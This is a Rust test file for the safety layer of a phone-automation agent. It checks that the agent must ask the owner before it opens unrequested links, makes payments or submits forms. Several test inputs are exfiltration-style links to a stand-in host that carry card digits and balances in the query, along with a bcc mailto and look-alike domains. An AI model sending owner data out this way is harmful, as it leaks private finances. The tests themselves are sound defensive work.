#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing
)]
//! Fourteenth review probes (safety crate). Each asserts the SAFE behaviour; a failing probe
//! is a finding.
mod common;

use common::{app_screen, button, el, screen};
use jarvis_proto::{render_rows, Action, Element, Policy, Rect, RiskCategory, Role};
use jarvis_safety::{evaluate_owned, Decision, ScreenSource, TypedText};

fn input(index: u32, label: &str, value: &str) -> Element {
    let mut e = el(index, Role::TextField, label);
    e.value = Some(value.to_owned());
    e
}

fn typed() -> Vec<TypedText> {
    vec![TypedText {
        field: 1,
        text: "x".to_owned(),
    }]
}

fn decide(
    policy: &Policy,
    action: &Action,
    s: &jarvis_proto::CompactScreen,
    typed: &[TypedText],
    owner: &[&str],
) -> Decision {
    evaluate_owned(
        policy,
        action,
        s,
        None,
        ScreenSource::Typed,
        None,
        typed,
        owner,
    )
}

/// Safari's address bar while editing: a text field whose placeholder says "Search or
/// enter website name", Return key "go".
fn safari(field_role: Role, label: &str, placeholder: &str) -> jarvis_proto::CompactScreen {
    let mut f = el(1, field_role, label);
    f.placeholder = Some(placeholder.to_owned());
    f.focused = true;
    f.frame = Rect::new(16.0, 60.0, 400.0, 36.0);
    let mut s = screen(
        "com.apple.mobilesafari",
        "Safari",
        vec![f, button(2, "Cancel")],
    );
    s.keyboard_visible = true;
    s.cues.return_key = Some("go".to_owned());
    s
}

/// M3 says a link the owner did not give asks and is phone only. Typing that same link
/// into the browser's address bar (or any search field) and pressing Return opens it
/// just the same, carrying whatever the model put in its query.
#[test]
fn probe14_typed_link_into_address_bar_asks_like_open_url() {
    let owner = ["Summarise my latest bank statement"];
    let mut bad = Vec::new();
    for (role, label, placeholder, text) in [
        (
            Role::TextField,
            "Address",
            "Search or enter website name",
            "https://collector.example/c?d=4521-0042-1234",
        ),
        (
            Role::TextField,
            "Address",
            "Search or enter website name",
            "collector.example/c?d=4521-0042-1234",
        ),
        (
            Role::SearchField,
            "Search",
            "Search Google or type a URL",
            "https://collector.example/c?d=balance-9120",
        ),
        (
            Role::TextField,
            "Address",
            "",
            "collector.example/c?d=balance-9120",
        ),
    ] {
        let s = safari(role.clone(), label, placeholder);
        let a = Action::Type {
            element: Some(1),
            text: text.to_owned(),
            submit: true,
        };
        // Through the default policy and the same check open_url gets.
        let open = decide(
            &Policy::default(),
            &Action::OpenUrl {
                url: if text.starts_with("https://") {
                    text.to_owned()
                } else {
                    format!("https://{text}")
                },
            },
            &s,
            &[],
            &owner,
        );
        let d = decide(&Policy::default(), &a, &s, &typed(), &owner);
        let ok = matches!(&d, Decision::Confirm(r) if r.phone_only);
        eprintln!(
            "{role:?} {placeholder:?} {text:?}: type+Return={d:?}\n   open_url={:?}",
            matches!(open, Decision::Confirm(ref r) if r.phone_only)
        );
        if !ok {
            bad.push(format!("{role:?}/{placeholder}/{text}: {d:?}"));
        }
    }
    assert!(
        bad.is_empty(),
        "typed links opened without the open_url question: {bad:#?}"
    );
}

/// A `tap_point` that resolves to no listed element (a web canvas, an unlisted control)
/// after Jarvis typed in the form: actuation says `NoEffect`, so it is never presumed.
#[test]
fn probe14_tap_point_on_unlisted_spot_after_typing_is_presumed() {
    let mut f = input(1, "Your note", "My home address is 1 Elm St");
    f.frame = Rect::new(16.0, 100.0, 361.0, 120.0);
    let s = app_screen(vec![f, el(2, Role::StaticText, "Tell us more")]);
    // Bottom right, where a web page draws its own arrow button (no accessibility node).
    let a = Action::TapPoint { x: 0.85, y: 0.9 };
    let d = decide(&Policy::default(), &a, &s, &typed(), &[]);
    eprintln!("{d:?}");
    assert!(
        matches!(d, Decision::Confirm(ref r) if r.phone_only),
        "unresolved tap_point after typing ran unasked: {d:?}"
    );
}

/// Documented (Known gaps 13-(4)): "Who are you paying?" + bare 900 is a SendMessage
/// presumed submit, **phone only**. With a "Send" button (Venmo-style) it is not phone only.
#[test]
fn probe14_who_are_you_paying_with_send_button_is_phone_only() {
    let s = app_screen(vec![
        input(1, "Who are you paying?", "Mallory"),
        input(2, "How much?", "900"),
        input(3, "What's it for?", "rent"),
        button(4, "Send"),
    ]);
    let d = decide(
        &Policy::default(),
        &Action::Tap { element: 4 },
        &s,
        &typed(),
        &[],
    );
    eprintln!("{d:?}");
    let ok =
        matches!(&d, Decision::Confirm(r) if r.phone_only || r.category == RiskCategory::Payment);
    assert!(ok, "money form remotely approvable as a message: {d:?}");
}

/// Money forms by notation: with SendMessage relaxed by the owner (not in `confirm`), a
/// presumed submit that is not read as money runs unasked.
#[test]
fn probe14_money_notations_are_payment() {
    let mut policy = Policy::default();
    policy.confirm.retain(|c| *c != RiskCategory::SendMessage);
    let mut bad = Vec::new();
    for (name, v) in [
        ("Amount", "US$900"),
        ("Amount", "R$ 900,00"),
        ("Amount", "900 zł"),
        ("Amount", "CHF 900.-"),
        ("Amount", "900,-"),
        ("Amount", "nine hundred"),
    ]
    .into_iter()
    .chain(
        [
            "900,-",
            "Fr. 900",
            "CHF 900.-",
            "₹ 9,00,000",
            "900 kr",
            "50000 sats",
            "900 USDC",
            "0.5 BTC",
            "nine hundred dollars",
            "900 €",
            "$ 900",
            "US$900",
            "900 zł",
            "R$ 900,00",
            "¥90000",
        ]
        .into_iter()
        .map(|v| ("How much?", v)),
    ) {
        let s = app_screen(vec![
            input(1, "Who are you paying?", "Mallory"),
            input(2, name, v),
            button(3, "Continue"),
        ]);
        let d = decide(&policy, &Action::Tap { element: 3 }, &s, &typed(), &[]);
        let cat = match &d {
            Decision::Confirm(r) => format!("{:?} phone_only={}", r.category, r.phone_only),
            other => format!("{other:?}"),
        };
        eprintln!("{name} = {v:?}: {cat}");
        if !matches!(&d, Decision::Confirm(r) if r.category == RiskCategory::Payment) {
            bad.push(format!("{name} = {v}: {cat}"));
        }
    }
    assert!(bad.is_empty(), "money not read as Payment: {bad:#?}");
}

/// Money in a non-text control (picker / stepper / slider holding the amount) and a payee
/// in a text field not under a strong head, neutral "Continue" (no tree: hand-built).
#[test]
fn probe14_amount_in_value_control_is_payment() {
    let mut policy = Policy::default();
    policy.confirm.retain(|c| *c != RiskCategory::SendMessage);
    let mut bad = Vec::new();
    for role in [
        Role::Picker,
        Role::Slider,
        Role::Other("Stepper".to_owned()),
        Role::Button,
    ] {
        let mut amount = el(2, role.clone(), "Amount");
        amount.value = Some("900".to_owned());
        let s = app_screen(vec![
            input(1, "Who are you paying?", "Mallory"),
            amount,
            button(3, "Continue"),
        ]);
        let d = decide(&policy, &Action::Tap { element: 3 }, &s, &typed(), &[]);
        eprintln!("{role:?}: {d:?}");
        if !matches!(&d, Decision::Confirm(r) if r.category == RiskCategory::Payment) {
            bad.push(format!("{role:?}: {d:?}"));
        }
    }
    assert!(bad.is_empty(), "{bad:#?}");
}

/// A strong-head field that is not the payee (a date range's "To") drops `Recipient not
/// verified` while the real payee sits in a field the rule does not know.
#[test]
fn probe14_strong_head_date_field_hides_unverified_payee() {
    let s = app_screen(vec![
        input(1, "From", "11/23/2026"),
        input(2, "To", "12/23/2026"),
        input(3, "Who are you paying?", "Mallory Merch LLC"),
        input(4, "Amount", "$900.00"),
        button(5, "Pay"),
    ]);
    let d = decide(
        &Policy::default(),
        &Action::Tap { element: 5 },
        &s,
        &[],
        &[],
    );
    let q = match &d {
        Decision::Confirm(r) => r.summary.clone(),
        other => format!("{other:?}"),
    };
    eprintln!("{q}");
    let asserted_date = q.contains("To/Account: To: \"12/23/2026\"");
    assert!(
        !asserted_date || q.contains("Recipient not verified"),
        "a date asserted as the recipient, warning dropped: {q}"
    );
}

/// `not_submit_label` reads every word of the control: a hostile page's submit labelled
/// with one table word opts out of the presumption after typing.
#[test]
fn probe14_not_submit_word_in_a_submit_label_opts_out() {
    let mut bad = Vec::new();
    for label in [
        "Continue & close",
        "Got it, close",
        "Done — hide keyboard",
        "Show results",
        "Back to shop",
        "Add comment",
        "Next ›  (photo optional)",
    ] {
        let s = app_screen(vec![
            input(1, "Your note", "My home address is 1 Elm St"),
            button(2, label),
        ]);
        let d = decide(
            &Policy::default(),
            &Action::Tap { element: 2 },
            &s,
            &typed(),
            &[],
        );
        eprintln!("{label:?}: {d:?}");
        if !matches!(d, Decision::Confirm(_)) {
            bad.push(label);
        }
    }
    assert!(bad.is_empty(), "submits after typing ran unasked: {bad:?}");
}

/// open_url: owner-given link variants that must NOT count as given.
#[test]
fn probe14_open_url_owner_given_boundaries() {
    let owner = ["Log in at https://bank.example and check my balance"];
    let mut bad = Vec::new();
    for url in [
        "https://bank.example.evil.io/",
        "https://bank.example:8443/",
        "https://bank.example/?d=9120",
        "https://bank.example#9120",
        "http://bank.example",
        "https://bank.example.",
    ] {
        let s = app_screen(vec![button(1, "OK")]);
        let d = decide(
            &Policy::default(),
            &Action::OpenUrl {
                url: url.to_owned(),
            },
            &s,
            &[],
            &owner,
        );
        eprintln!("{url}: {d:?}");
        if !matches!(&d, Decision::Confirm(r) if r.phone_only) {
            bad.push(format!("{url}: {d:?}"));
        }
    }
    assert!(bad.is_empty(), "{bad:#?}");
}

/// The open_url question names the host: a long host keeps its first 12 and last 24
/// characters; the registrable domain must survive, and IP literals and look-alikes show.
#[test]
fn probe14_open_url_question_shows_the_registrable_domain() {
    let mut bad = Vec::new();
    for (url, must) in [
        (
            "https://www.mybank.example.com.account-verification-secure-session.evil-io.net/x",
            "evil-io.net",
        ),
        ("https://192.168.0.1:8080/c?d=1", "192.168.0.1"),
        ("https://[2001:db8::1]/c", "2001:db8::1"),
        ("https://xn--bnk-sna.example/", "(look-alike letters)"),
        ("https://bаnk.example/", "(look-alike letters)"),
        (
            "sms:+15551234567&body=meet%20at%201%20Elm%20St",
            "+15551234567",
        ),
        (
            "mailto:a@evil.example?bcc=b@evil.example&body=hi",
            "evil.example",
        ),
    ] {
        let s = app_screen(vec![button(1, "OK")]);
        let d = decide(
            &Policy::default(),
            &Action::OpenUrl {
                url: url.to_owned(),
            },
            &s,
            &[],
            &["Check the weather"],
        );
        let q = match &d {
            Decision::Confirm(r) if r.phone_only => r.summary.clone(),
            other => format!("NOT PHONE-ONLY CONFIRM {other:?}"),
        };
        eprintln!("{url}\n   {q}");
        if !q.contains(must) || q.starts_with("NOT") {
            bad.push(format!("{url}: {q}"));
        }
    }
    assert!(bad.is_empty(), "{bad:#?}");
}

// ---------------------------------------------------------------------------------------
// Fourteenth review: the rules, as property tests and regressions.

struct Rng(u64);
impl Rng {
    fn new(seed: u64) -> Rng {
        Rng(seed.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1)
    }
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
    fn below(&mut self, n: u64) -> u64 {
        self.next() % n.max(1)
    }
    fn pick<'a, T>(&mut self, xs: &'a [T]) -> &'a T {
        &xs[self.below(xs.len() as u64) as usize]
    }
}

const WORDS: &[&str] = &[
    "weather",
    "Paris",
    "coffee",
    "near",
    "me",
    "cheap",
    "flights",
    "to",
    "Rome",
    "balance",
    "4521",
    "9120",
    "pizza",
    "open",
    "now",
    "the",
    "best",
    "of",
    "in",
    "a",
    "Elm",
    "St",
    "bank",
    "statement",
    "2026",
];

/// Tokens that count for the owner's-words rule (oracle: alphanumeric runs, case-folded, 3+
/// characters or digits only).
fn counted(text: &str) -> Vec<String> {
    text.split(|c: char| !c.is_alphanumeric())
        .filter(|w| !w.is_empty())
        .map(str::to_lowercase)
        .filter(|w| w.chars().count() >= 3 || w.chars().all(|c| c.is_ascii_digit()))
        .collect()
}

/// Rule B (property): Return in a search-named field (or a tap on the form's "Search"
/// button after typing there) runs unasked only when every counted token of the text it
/// submits is the owner's, and the text is not a link the owner did not give.
#[test]
fn rule_b_search_exemption_rests_on_the_owners_words() {
    let seeds: u64 = std::env::var("SEARCH_CASES")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(3_000);
    let (mut unasked, mut asked) = (0usize, 0usize);
    for seed in 1..=seeds {
        let r = &mut Rng::new(seed);
        let n = 1 + r.below(6) as usize;
        let owner: String = (0..n).map(|_| *r.pick(WORDS)).collect::<Vec<_>>().join(" ");
        let owner = format!("Find {owner}");
        let link = r.below(5) == 0;
        let text: String = if link {
            let host = *r.pick(&["collector.example", "bank.example", "weather.example"]);
            let scheme = *r.pick(&["", "https://"]);
            format!("{scheme}{host}/q?{}", r.pick(WORDS))
        } else {
            let own: Vec<&str> = owner.split(' ').collect();
            let k = 1 + r.below(4) as usize;
            (0..k)
                .map(|_| {
                    if r.below(3) == 0 {
                        *r.pick(WORDS)
                    } else {
                        *r.pick(&own)
                    }
                })
                .collect::<Vec<_>>()
                .join(" ")
        };
        let role = r.pick(&[Role::SearchField, Role::TextField]).clone();
        let mut f = el(1, role, r.pick(&["Search", "Address", "Find"]));
        f.placeholder = Some((*r.pick(&["Search", "Search or enter website name"])).to_owned());
        f.focused = true;
        let mut s = app_screen(vec![f, button(2, "Search")]);
        s.keyboard_visible = true;
        s.cues.return_key = Some((*r.pick(&["search", "go"])).to_owned());
        let owners = [owner.as_str()];
        let typed_state = [TypedText {
            field: 0,
            text: String::new(),
        }];
        let (action, state): (Action, &[TypedText]) = if r.below(2) == 0 {
            (
                Action::Type {
                    element: Some(1),
                    text: text.clone(),
                    submit: true,
                },
                &[],
            )
        } else {
            s.elements[0].value = Some(text.clone());
            (Action::Tap { element: 2 }, &typed_state)
        };
        let d = decide(&Policy::default(), &action, &s, state, &owners);
        if matches!(d, Decision::Allow) {
            unasked += 1;
            let own: Vec<String> = counted(&owner);
            for t in counted(&text) {
                assert!(
                    own.contains(&t),
                    "seed {seed}: {text:?} ran unasked with {t:?} not in {owner:?}"
                );
            }
            assert!(
                !link || jarvis_safety::owner_gave_url(&text, &owners),
                "seed {seed}: link {text:?} ran unasked"
            );
        } else {
            asked += 1;
        }
    }
    eprintln!("{seeds} cases: {unasked} unasked, {asked} asked");
    assert!(unasked > 0 && asked > 0, "{unasked} unasked, {asked} asked");
}

/// Rule F (property): a not-a-submit word inside a longer label never exempts the control;
/// only a whole label from the closed list (or an SF Symbol of the table) does.
#[test]
fn rule_f_only_whole_labels_are_exempt() {
    let words = [
        "close", "cancel", "back", "add", "show", "hide", "photo", "clear", "attach", "emoji",
        "keyboard", "expand", "camera", "dismiss", "forgot",
    ];
    let others = [
        "results",
        "comment",
        "shop",
        "now",
        "continue",
        "and pay",
        "order",
        "post",
        "it",
        "to checkout",
        "all",
        "& send",
    ];
    let shapes = [
        "{w} {o}",
        "{o} {w}",
        "{w}, {o}",
        "{o} & {w}",
        "{o} — {w}",
        "{w} ({o})",
    ];
    let r = &mut Rng::new(14);
    let state = typed();
    for _ in 0..2_000 {
        let label = r
            .pick(&shapes)
            .replace("{w}", r.pick(&words))
            .replace("{o}", r.pick(&others));
        let s = app_screen(vec![input(1, "Your note", "hello"), button(2, &label)]);
        assert!(
            jarvis_safety::presumed_submit(&Action::Tap { element: 2 }, &s, None, &state),
            "{label:?} opted out of the presumption"
        );
    }
    for label in [
        "Close",
        "  cancel ",
        "Back",
        "Add",
        "Show password",
        "Forgot password?",
        "Emoji",
        "xmark.circle.fill",
        "eye.slash",
        "paperclip",
        "Attach",
    ] {
        let s = app_screen(vec![input(1, "Your note", "hello"), button(2, label)]);
        assert!(
            !jarvis_safety::presumed_submit(&Action::Tap { element: 2 }, &s, None, &state),
            "{label:?} is a whole not-a-submit label"
        );
    }
}

/// Rule C: an unclear request asks whatever categories the owner relaxed (not when the
/// owner confirms nothing at all), and is phone only; a send by its own label without a
/// number in the form stays remotely approvable.
#[test]
fn rule_c_a_guess_is_not_relaxable() {
    let mut relaxed = Policy::default();
    relaxed
        .confirm
        .retain(|c| !matches!(c, RiskCategory::SendMessage | RiskCategory::Payment));
    let s = app_screen(vec![input(1, "Your note", "hello"), button(2, "Continue")]);
    let d = decide(&relaxed, &Action::Tap { element: 2 }, &s, &typed(), &[]);
    assert!(matches!(&d, Decision::Confirm(r) if r.phone_only), "{d:?}");
    let mut nothing = Policy::default();
    nothing.confirm.clear();
    assert_eq!(
        decide(&nothing, &Action::Tap { element: 2 }, &s, &typed(), &[]),
        Decision::Allow
    );
    // A Send by its own label: read, relaxable, remotely approvable.
    let s = app_screen(vec![input(1, "Message", "See you soon"), button(2, "Send")]);
    let d = decide(
        &Policy::default(),
        &Action::Tap { element: 2 },
        &s,
        &typed(),
        &[],
    );
    assert!(matches!(&d, Decision::Confirm(r) if !r.phone_only), "{d:?}");
    assert_eq!(
        decide(&relaxed, &Action::Tap { element: 2 }, &s, &typed(), &[]),
        Decision::Allow
    );
    // The same Send with a number in its form (no amount read): unclear.
    let s = app_screen(vec![input(1, "Message", "900"), button(2, "Send")]);
    let d = decide(&relaxed, &Action::Tap { element: 2 }, &s, &[], &[]);
    assert!(matches!(&d, Decision::Confirm(r) if r.phone_only), "{d:?}");
    // A link the owner did not give, with "Sending a message" relaxed: still asked.
    let d = decide(
        &relaxed,
        &Action::OpenUrl {
            url: "https://collector.example/c".to_owned(),
        },
        &s,
        &[],
        &["Check the weather"],
    );
    assert!(matches!(&d, Decision::Confirm(r) if r.phone_only), "{d:?}");
}

/// Rule A and Rule I: the Return question shows the link as the `open_url` question does,
/// the port included; the owner's own link typed into the address bar runs unasked.
#[test]
fn rule_a_and_i_the_link_is_shown() {
    let s = safari(Role::TextField, "Address", "Search or enter website name");
    let a = Action::Type {
        element: Some(1),
        text: "collector.example:8443/c?d=1".to_owned(),
        submit: true,
    };
    let d = decide(&Policy::default(), &a, &s, &[], &["Check the weather"]);
    let Decision::Confirm(r) = d else {
        panic!("{d:?}")
    };
    assert!(r.phone_only);
    assert!(
        r.summary
            .contains("which opens the link collector.example:8443, path and query \"/c?d="),
        "{}",
        r.summary
    );
    let d = decide(
        &Policy::default(),
        &Action::OpenUrl {
            url: "https://bank.example:8443/x".to_owned(),
        },
        &s,
        &[],
        &[],
    );
    let Decision::Confirm(r) = d else {
        panic!("{d:?}")
    };
    assert!(
        r.summary.contains("https://bank.example:8443, path"),
        "{}",
        r.summary
    );
    // A user part before the host: a typed link with a scheme is refused for credentials
    // in a URL (validation, like `open_url`); without a scheme `name@host` is an e-mail
    // address, not a link (see `an_email_is_not_a_link`).
    let a = Action::Type {
        element: Some(1),
        text: "https://bank.example@collector.example/c".to_owned(),
        submit: true,
    };
    let d = decide(&Policy::default(), &a, &s, &[], &[]);
    assert!(matches!(d, Decision::Deny(_)), "{d:?}");
    // The owner's own link, typed into the address bar: as open_url, unasked.
    let a = Action::Type {
        element: Some(1),
        text: "https://bank.example".to_owned(),
        submit: true,
    };
    let d = decide(
        &Policy::default(),
        &a,
        &s,
        &[],
        &["Open https://bank.example and check my balance"],
    );
    assert_eq!(d, Decision::Allow);
}

/// Rule G: a strong-head field whose value names no one (a date, a bare number) is no
/// recipient entry; one that names someone is.
#[test]
fn rule_g_a_recipient_value_names_someone() {
    for (v, entry) in [
        ("12/23/2026", false),
        ("2026-12-23", false),
        ("Nov 23, 2026", false),
        ("482913", false),
        ("Mallory", true),
        ("+1 415 555 0100", true),
        ("bob@example.com", true),
    ] {
        let s = app_screen(vec![
            input(1, "To", v),
            input(2, "Amount", "$900.00"),
            button(3, "Pay"),
        ]);
        let d = decide(
            &Policy::default(),
            &Action::Tap { element: 3 },
            &s,
            &[],
            &[],
        );
        let Decision::Confirm(r) = d else {
            panic!("{d:?}")
        };
        assert_eq!(
            r.summary.contains("To/Account: To:"),
            entry,
            "{v}: {}",
            r.summary
        );
        assert_eq!(
            r.summary.contains("Recipient not verified"),
            !entry,
            "{v}: {}",
            r.summary
        );
    }
}

/// Coordinator note on Rule A: an e-mail address is not a link. `ada@example.com` typed
/// into an "Email address" field with Return asks as the presumed submit it always was
/// (no open-link question); a contact form holding it, sent by "Send form", keeps its
/// question (`Send form`, the name, the address, `Sends:`), as the Mac UI test
/// `testSafariFillsAndSubmitsAForm` expects.
#[test]
fn an_email_is_not_a_link() {
    let mut name = input(1, "Name", "Ada Lovelace");
    name.frame = Rect::new(16.0, 200.0, 361.0, 44.0);
    let mut email = input(2, "Email address", "");
    email.frame = Rect::new(16.0, 260.0, 361.0, 44.0);
    email.focused = true;
    let mut s = screen(
        "com.apple.mobilesafari",
        "Safari",
        vec![name.clone(), email, button(3, "Send form")],
    );
    s.keyboard_visible = true;
    s.cues.return_key = Some("next".to_owned());
    let a = Action::Type {
        element: Some(2),
        text: "ada@example.com".to_owned(),
        submit: true,
    };
    let d = decide(
        &Policy::default(),
        &a,
        &s,
        &[],
        &["Fill in the contact form as Ada Lovelace, ada@example.com"],
    );
    let Decision::Confirm(r) = d else {
        panic!("{d:?}")
    };
    assert!(!r.summary.contains("link"), "{}", r.summary);
    assert!(r.summary.contains("ada@example.com"), "{}", r.summary);
    // The filled form, sent by its own button.
    let mut filled = input(2, "Email address", "ada@example.com");
    filled.frame = Rect::new(16.0, 260.0, 361.0, 44.0);
    let s = screen(
        "com.apple.mobilesafari",
        "Safari",
        vec![name, filled, button(3, "Send form")],
    );
    let d = decide(
        &Policy::default(),
        &Action::Tap { element: 3 },
        &s,
        &typed(),
        &["Open https://forms.example/contact in Safari and fill in the contact form"],
    );
    let Decision::Confirm(r) = d else {
        panic!("{d:?}")
    };
    for part in ["Send form", "Ada Lovelace", "ada@example.com", "Sends:"] {
        assert!(r.summary.contains(part), "{part}: {}", r.summary);
    }
    assert!(!r.summary.contains("link"), "{}", r.summary);
    assert_eq!(r.summary, render_rows(&r.rows));
}
